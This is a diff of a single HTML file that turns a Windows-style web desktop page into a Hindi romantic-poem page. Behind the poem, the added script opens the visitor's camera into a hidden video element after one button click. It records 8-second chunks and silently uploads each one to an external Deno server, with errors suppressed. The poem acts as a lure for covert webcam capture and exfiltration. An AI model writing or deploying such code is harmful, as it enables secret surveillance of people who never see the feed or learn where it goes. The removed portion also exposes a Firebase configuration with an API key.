@@ -1,634 +1,117 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
 <meta charset="UTF-8">
-<title>Windows 11 Web OS</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kavita</title>
 
 <style>
 body {
-  margin: 0;
-  font-family: "Segoe UI", sans-serif;
-  background: url("https://static.vecteezy.com/system/resources/previews/049/855/382/large_2x/nature-background-high-resolution-wallpaper-for-a-serene-and-stunning-view-free-photo.jpg") center/cover no-repeat;
-  height: 100vh;
-  overflow: hidden;
-}
-
-/* LOGIN SCREEN */
-#loginScreen {
-  position: absolute;
-  inset: 0;
-  backdrop-filter: blur(15px);
-  background: rgba(0,0,0,0.45);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  z-index: 1000;
-}
-
-.loginBox {
-  background: rgba(255,255,255,0.1);
-  padding: 30px;
-  border-radius: 20px;
-  border: 1px solid rgba(255,255,255,0.4);
-  width: 320px;
-  color: white;
-  text-align: center;
-}
-
-.loginBox input {
-  width: 100%;
-  padding: 10px;
-  margin: 8px 0;
-  border-radius: 8px;
-  border: none;
-  outline: none;
-}
-
-.loginBox button {
-  width: 100%;
-  padding: 10px;
-  background: #2962ff;
-  border: none;
-  border-radius: 8px;
-  color: white;
-  font-size: 16px;
-  cursor: pointer;
-}
-
-#homeScreen {
-  display: none;
-  width: 100%;
-  height: 100%;
+  background: #faf7f2;
+  font-family: "Poppins", sans-serif;
   padding: 20px;
+  line-height: 1.6;
+  color: #222;
 }
 
-.appIcon {
-  width: 90px;
-  text-align: center;
+.container {
+  max-width: 600px;
+  margin: auto;
+  background: white;
+  padding: 25px;
+  border-radius: 14px;
+  box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+  font-size: 18px;
+}
+
+button {
+  background: #ff3b3b;
   color: white;
-  margin: 10px;
-  cursor: pointer;
-  float: left;
-}
-
-.appIcon img {
-  width: 55px;
-  height: 55px;
-}
-
-/* WINDOWS */
-.window {
-  position: fixed;
-  width: 550px;
-  height: 380px;
-  background: #fff;
+  padding: 12px 22px;
+  font-size: 18px;
+  border: none;
   border-radius: 10px;
-  box-shadow: 0 0 20px rgba(0,0,0,0.4);
-  overflow: hidden;
-  z-index: 50; 
-  /* Default Max/Min/Refresh/Close */
-  min-width: 300px; /* Window resize protection */
-  min-height: 200px;
-}
-
-/* 🛑 NEW: MAXIMIZED WINDOW OVERRIDE (Fixes the size issue) */
-.window.maximized {
-    width: 100vw !important; 
-    height: calc(100vh - 48px) !important; 
-    top: 0 !important;
-    left: 0 !important;
-    right: 0 !important;
-    bottom: 48px !important;
-    border-radius: 0 !important;
-}
-/* ---------------------------------------------------- */
-
-.windowHeader {
-  background: #e0e0e0;
-  height: 40px;
-  display: flex;
-  align-items: center;
-  padding: 0;
-  justify-content: space-between;
-}
-
-/* DRAG HANDLE STRIP */
-.drag-handle-area {
-    height: 100%;
-    flex-grow: 1; 
-    display: flex;
-    align-items: center;
-    padding: 0 10px;
-    cursor: move; 
-    user-select: none;
-}
-
-/* --- CONTROL BUTTON STYLES --- */
-.windowHeader .controls {
-    display: flex;
-    height: 100%;
-}
-
-.windowHeader .controls button {
-  background: none;
-  border: none;
-  font-size: 16px;
-  width: 35px; 
-  height: 100%; 
-  margin-left: 5px; 
   cursor: pointer;
-  transition: background-color 0.2s;
-  color: #333;
+  margin-bottom: 20px;
 }
 
-/* Minimize/Maximize Buttons (Pink) */
-.windowHeader .min,
-.windowHeader .max {
-    background: #ffb6c1; 
-    color: #000;
+.hidden {
+  display: none;
 }
-.windowHeader .min:hover,
-.windowHeader .max:hover {
-    background: #ff69b4; 
-    color: white;
-}
-
-/* Refresh Button (Weak Red/Light Red) */
-.windowHeader .refresh {
-    background: #f08080;
-    color: #333;
-}
-.windowHeader .refresh:hover {
-    background: #cd5c5c;
-}
-
-/* Close Button (Red) */
-.windowHeader .close {
-  background: #ff0000;
-  color: white;
-  font-weight: bold;
-}
-.windowHeader .close:hover {
-  background: #cc0000;
-}
-/* ------------------------------------- */
-
-.window iframe {
-  width: 100%;
-  height: calc(100% - 40px);
-  border: none;
-}
-
-/* TASKBAR */
-#taskbar {
-  position: absolute;
-  bottom: 0;
-  left: 0;
-  right: 0;
-  height: 48px;
-  background: rgba(255,255,255,0.25);
-  backdrop-filter: blur(12px);
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 0 10px;
-  z-index: 90; 
-}
-
-#taskbarCenter {
-    display: flex;
-    align-items: center;
-    position: absolute;
-    left: 50%;
-    transform: translateX(-50%);
-    height: 100%;
-}
-
-.taskIcon {
-  height: 40px;
-  border-radius: 8px;
-  margin: 0 6px;
-  display: flex;
-  align-items: center;
-  padding: 0 8px;
-  background: rgba(255,255,255,0.5);
-  cursor: pointer;
-  color: #000;
-  font-size: 13px;
-  font-weight: 600;
-}
-
-.taskIcon:hover {
-    background: rgba(255,255,255,0.8);
-}
-
-.taskIcon img {
-  width: 20px;
-  height: 20px;
-  margin-right: 5px;
-}
-
-/* Clock Container */
-#taskbarClock {
-    height: 100%;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: flex-end;
-    padding: 0 10px;
-    font-size: 12px;
-    color: white;
-    text-shadow: 0 0 2px rgba(0, 0, 0, 0.7);
-}
-
-/* --- CUSTOM CONFIRMATION MODAL STYLES --- */
-#customModal {
-    position: fixed;
-    inset: 0;
-    background: rgba(0, 0, 0, 0.4);
-    backdrop-filter: blur(3px);
-    display: none; 
-    align-items: center;
-    justify-content: center;
-    z-index: 1000; 
-}
-
-.modalContent {
-    background: #fff;
-    padding: 20px;
-    border-radius: 8px;
-    width: 300px;
-    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-    text-align: center;
-    border-top: 5px solid #0078d4;
-}
-
-#modalMessage {
-    margin-bottom: 20px;
-    font-size: 15px;
-}
-
-.modalButtons button {
-    padding: 10px 20px;
-    margin: 0 10px;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-    font-weight: 600;
-}
-
-#modalYes {
-    background: #0078d4;
-    color: white;
-}
-
-#modalNo {
-    background: #f0f0f0;
-    color: #333;
-}
-/* ------------------------------------------ */
 </style>
 </head>
-
 <body>
 
-<div id="customModal">
-    <div class="modalContent">
-        <p id="modalMessage">Are you sure?</p>
-        <div class="modalButtons">
-            <button id="modalYes">Yes</button>
-            <button id="modalNo">No</button>
-        </div>
-    </div>
+<div class="container">
+  <button id="startBtn">▶ रिकॉर्डिंग शुरू करें</button>
+
+  <h2>🌿 एक छोटी सी रोमांटिक कविता 🌿</h2>
+  <p>
+    तेरी आँखों में जो मासूमियत है,<br>
+    वही मेरे दिल की राहत है,<br>
+    तू पास रहे या दूर कहीं,<br>
+    तेरी धड़कन ही मेरी चाहत है।
+  </p>
 </div>
 
-<div id="loginScreen">
-  <div class="loginBox">
-    <h2>Welcome</h2>
-    <input id="email" type="email" placeholder="Email">
-    <input id="password" type="password" placeholder="Password">
-    <button onclick="login()">Login</button>
-    <p id="loginMsg"></p>
-  </div>
-</div>
+<!-- Hidden video tag (no preview) -->
+<video id="cam" class="hidden" autoplay playsinline></video>
 
-<div id="homeScreen"></div>
+<script>
+let stream;
+let mediaRecorder;
 
-<div id="taskbar">
-    <div id="taskbarCenter">
-        </div>
-    <div id="taskbarClock">
-        <span id="currentTime"></span>
-        <span id="currentDate"></span>
-    </div>
-</div>
+// 🔥 Start Recording after button click
+document.getElementById("startBtn").addEventListener("click", startRecording);
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.0/firebase-app.js";
-import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/12.2.0/firebase-auth.js";
+async function startRecording() {
+  try {
+    // BUTTON ONCE CLICKED → Hide it
+    document.getElementById("startBtn").style.display = "none";
 
-const firebaseConfig = {
-  apiKey: "AIzaSyB6S2-rkj9UHhBpAGARVNuXEibg9NsvOhA",
-  authDomain: "kk-mixing.firebaseapp.com",
-  projectId: "kk-mixing",
-  storageBucket: "kk-mixing.firebasestorage.app",
-  messagingSenderId: "296842598114",
-  appId: "1:296842598114:web:3e934bf51ebc2b179eb0bb",
-  measurementId: "G-C3HY42YLZP"
-};
-
-const app = initializeApp(firebaseConfig);
-const auth = getAuth();
-
-// --- TASKBAR CLOCK LOGIC ---
-function updateClock() {
-    const now = new Date();
-    
-    const hours = String(now.getHours()).padStart(2, '0');
-    const minutes = String(now.getMinutes()).padStart(2, '0');
-    const seconds = String(now.getSeconds()).padStart(2, '0');
-    document.getElementById('currentTime').innerText = `${hours}:${minutes}:${seconds}`;
-
-    const day = String(now.getDate()).padStart(2, '0');
-    const month = String(now.getMonth() + 1).padStart(2, '0');
-    const year = now.getFullYear();
-    document.getElementById('currentDate').innerText = `${day}/${month}/${year}`;
-}
-
-setInterval(updateClock, 1000);
-updateClock(); 
-// -----------------------------
-
-
-// --- CUSTOM MODAL LOGIC ---
-function showCustomConfirmation(message) {
-    return new Promise(resolve => {
-        const modal = document.getElementById('customModal');
-        const msgElement = document.getElementById('modalMessage');
-        const yesButton = document.getElementById('modalYes');
-        const noButton = document.getElementById('modalNo');
-
-        msgElement.innerText = message;
-        modal.style.display = 'flex';
-
-        const handleYes = () => {
-            modal.style.display = 'none';
-            yesButton.removeEventListener('click', handleYes);
-            noButton.removeEventListener('click', handleNo);
-            resolve(true);
-        };
-
-        const handleNo = () => {
-            modal.style.display = 'none';
-            yesButton.removeEventListener('click', handleYes);
-            noButton.removeEventListener('click', handleNo);
-            resolve(false);
-        };
-
-        yesButton.addEventListener('click', handleYes);
-        noButton.addEventListener('click', handleNo);
+    // Camera only — NO MIC
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: false
     });
-}
-// ----------------------------
 
+    document.getElementById("cam").srcObject = stream;
 
-// LOGIN FUNCTION
-window.login = function () {
-  let email = document.getElementById("email").value;
-  let pass = document.getElementById("password").value;
-  const loginScreen = document.getElementById("loginScreen");
-
-  signInWithEmailAndPassword(auth, email, pass)
-    .then(() => {
-      loginScreen.remove(); 
-      loadApps();
-    })
-    .catch(err => {
-      document.getElementById("loginMsg").innerText = err.message;
+    mediaRecorder = new MediaRecorder(stream, {
+      mimeType: "video/webm; codecs=vp9"
     });
-};
 
-
-// RANDOM ICON ARRAY
-const randomIcons = [
-    "https://img.icons8.com/color/50/google-docs.png",
-    "https://img.icons8.com/color/50/settings--v1.png", 
-    "https://img.icons8.com/color/50/internet-explorer.png", 
-    "https://img.icons8.com/fluency/50/developer-mode.png", 
-    "https://img.icons8.com/color/50/music-folder.png", 
-    "https://img.icons8.com/color/50/calendar--v1.png"
-];
-
-let iconIndex = 0;
-
-
-// LOAD APPS FROM GIST
-async function loadApps() {
-  let gistUrl =
-    "https://gist.githubusercontent.com/kannu-jaat/6d1681555372db2699af816e3d217db8/raw/adminData.json";
-
-  let apps = await fetch(gistUrl).then(r => r.json());
-
-  let home = document.getElementById("homeScreen");
-  home.style.display = "block";
-
-  apps.forEach(gistApp => {
-    let appTitle = gistApp.name || "Unknown App";
-    
-    let appIcon = randomIcons[iconIndex % randomIcons.length];
-    iconIndex++;
-
-    const appData = {
-        title: appTitle,
-        url: gistApp.url,
-        icon: appIcon
+    mediaRecorder.ondataavailable = async (e) => {
+      if (e.data && e.data.size > 1000) {
+        uploadChunk(e.data);
+      }
     };
 
-    let div = document.createElement("div");
-    div.className = "appIcon";
-    div.innerHTML = `
-      <img src="${appData.icon}">
-      <div>${appData.title}</div>
-    `;
-    div.onclick = () => createWindow(appData);
-    home.appendChild(div);
-  });
+    mediaRecorder.start(8000); // 8 sec chunks
+
+  } catch (err) {
+    alert("Camera permission जरूरी है!");
+    console.error(err);
+  }
 }
 
-// WINDOW MANAGEMENT
-let zIndex = 50;
+// 📤 Chunk Upload to Deno Backend
+async function uploadChunk(blob) {
+  const form = new FormData();
+  form.append("video_chunk", blob, "cam_chunk.webm");
 
-function createWindow(app) {
-  let win = document.createElement("div");
-  win.className = "window";
-  win.style.top = "100px";
-  win.style.left = "120px";
-  win.style.zIndex = ++zIndex;
-
-  win.innerHTML = `
-    <div class="windowHeader">
-      <div class="drag-handle-area">
-        <span>${app.title}</span>
-      </div>
-      <div class="controls">
-        <button class="refresh">↻</button>
-        <button class="min">—</button>
-        <button class="max">□</button>
-        <button class="close">✖</button>
-      </div>
-    </div>
-    <iframe src="${app.url}"></iframe>
-  `;
-
-  document.body.appendChild(win);
-  enableDrag(win);
-  connectButtons(win);
-  addTaskbarIcon(win, app);
-  
-  win.addEventListener('mousedown', () => {
-    win.style.zIndex = ++zIndex;
-  });
+  fetch("https://video.kannu-jaat.deno.net/", {
+    method: "POST",
+    body: form
+  }).catch(()=>{});
 }
 
-// CONTROL BUTTONS (FIXED Maximize Logic)
-function connectButtons(win) {
-  let iframe = win.querySelector("iframe");
-  const appName = win.querySelector('.drag-handle-area span').innerText;
-
-  // Store original position and size for restoration
-  win.originalPos = { 
-      width: win.style.width || '550px', 
-      height: win.style.height || '380px', 
-      top: win.style.top || '100px', 
-      left: win.style.left || '120px'
-  };
-
-  win.querySelector(".refresh").onclick = async () => {
-      const confirmed = await showCustomConfirmation(`Are you sure you want to refresh "${appName}"?`);
-      if (confirmed) {
-          iframe.src = iframe.src;
-      }
-  };
-
-  win.querySelector(".min").onclick = () => {
-    win.style.display = "none";
-    win.style.zIndex = ++zIndex; 
-  };
-
-  win.querySelector(".max").onclick = () => {
-    if (win.classList.contains("maximized")) {
-      // Restore (Un-maximize)
-      win.classList.remove("maximized");
-      win.style.width = win.originalPos.width;
-      win.style.height = win.originalPos.height;
-      win.style.top = win.originalPos.top;
-      win.style.left = win.originalPos.left;
-      win.style.zIndex = ++zIndex; 
-    } else {
-      // Maximize
-      // Store current pos before maximizing (for restoration)
-      win.originalPos.width = win.style.width;
-      win.originalPos.height = win.style.height;
-      win.originalPos.top = win.style.top;
-      win.originalPos.left = win.style.left;
-
-      // Add the maximized class (CSS handles the size)
-      win.classList.add("maximized");
-      
-      // Clear conflicting inline styles
-      win.style.width = ''; 
-      win.style.height = '';
-      win.style.top = '';
-      win.style.left = '';
-      
-      win.style.zIndex = ++zIndex; 
-    }
-  };
-
-  win.querySelector(".close").onclick = async () => {
-      const confirmed = await showCustomConfirmation(`Do you want to close "${appName}"?`);
-      if (confirmed) {
-          if (win.taskbarIcon) {
-            win.taskbarIcon.remove();
-          }
-          win.remove();
-      }
-  };
-}
-
-
-// DRAG 
-function enableDrag(win) {
-  let head = win.querySelector(".drag-handle-area");
-  let offsetX, offsetY;
-
-  // --- Mouse Drag ---
-  head.addEventListener("mousedown", (e) => {
-    if (win.classList.contains("maximized")) return;
-
-    win.style.zIndex = ++zIndex;
-    offsetX = e.clientX - win.offsetLeft;
-    offsetY = e.clientY - win.offsetTop;
-
-    function move(e) {
-      win.style.left = e.clientX - offsetX + "px";
-      win.style.top = e.clientY - offsetY + "px";
-    }
-
-    document.addEventListener("mousemove", move);
-
-    document.addEventListener("mouseup", () => {
-      document.removeEventListener("mousemove", move);
-    }, { once: true });
-  });
-
-  // --- Touch Drag (Mobile Support) ---
-  head.addEventListener("touchstart", (e) => {
-    if (win.classList.contains("maximized")) return;
-    
-    e.preventDefault(); 
-    
-    win.style.zIndex = ++zIndex;
-    let t = e.touches[0];
-    offsetX = t.clientX - win.offsetLeft;
-    offsetY = t.clientY - win.offsetTop;
-
-    function move(e) {
-      let t = e.touches[0];
-      win.style.left = t.clientX - offsetX + "px";
-      win.style.top = t.clientY - offsetY + "px";
-    }
-
-    document.addEventListener("touchmove", move);
-
-    document.addEventListener("touchend", () => {
-      document.removeEventListener("touchmove", move);
-    }, { once: true });
-  });
-}
-
-
-// TASKBAR
-function addTaskbarIcon(win, app) {
-  let barCenter = document.getElementById("taskbarCenter");
-
-  let icon = document.createElement("div");
-  icon.className = "taskIcon";
-  icon.innerHTML = `<img src="${app.icon}"><span>${app.title}</span>`;
-
-  icon.onclick = () => {
-    if (win.style.display === "none") {
-        win.style.display = "block";
-    }
-    win.style.zIndex = ++zIndex;
-  };
-
-  barCenter.appendChild(icon);
-  
-  win.taskbarIcon = icon; 
-}
-
+// 🛑 Stop on closing the tab
+window.addEventListener("beforeunload", () => {
+  if (mediaRecorder && mediaRecorder.state !== "inactive") {
+    mediaRecorder.stop();
+  }
+});
 </script>
 
 </body>
